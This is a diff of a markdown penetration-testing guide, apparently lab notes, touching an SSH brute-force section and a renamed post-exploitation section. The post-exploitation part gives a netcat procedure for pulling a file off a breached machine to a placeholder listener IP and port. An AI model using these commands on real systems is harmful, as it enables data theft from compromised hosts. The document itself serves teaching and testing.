@@ -38,10 +38,10 @@ When presenting these examples I will be going through these steps
 - Desc: The SSH service allows for communication between a computer network. 
 - Exploit: This is less of an exploit and more of poor system security. Users can prevent brute force attacks by incorporating a proper firewall to filter out ip addresses, using public key authentication, using strong and unqiue passwords, etc....
 
-## Payload Examples:
+## Post-Exploitation Example:
 - After gaining access to the remote system and starting a shell session, the user can manually use netcat to search for a specified file. Here is an example:
- - Open a terminal on the local host and run "nc -lnvp [portnum] > [file for info to be stored]"
- - On the remote machine (the breached machine) run the command " [IP of local machine] [portnum] < [file path to be retrieved]
+  - Open a terminal on the local host and run "nc -lnvp [portnum] > [file for info to be stored]"
+  - On the remote machine (the breached machine) run the command " [IP of local machine] [portnum] < [file path to be retrieved]
 
 # Guide To Testing:
 - Samba:
